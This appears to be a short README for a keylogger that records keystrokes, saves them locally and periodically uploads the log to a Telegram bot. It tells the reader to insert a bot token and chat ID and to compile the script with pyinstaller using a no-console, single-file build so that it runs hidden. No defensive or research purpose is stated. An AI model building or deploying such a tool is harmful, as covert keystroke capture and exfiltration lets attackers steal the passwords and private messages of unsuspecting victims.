#How It Works  

It capture the Keylogs, store it locally and periodically upload the file to the Server.  

---  

#Usage  

Note:__ Change the __TOKEN__ and __CHAT_ID__ to your Telegram Bot's Token and it's Chat id respectively, also set __INTERVAL__ according to you time requirements before making it executable. (The variables are in Keylogger.py)  

Compile the script using __pyinstaller__ to make the executable file.  

```sh
pyinstaller --noconsole --onefile keylogger.py
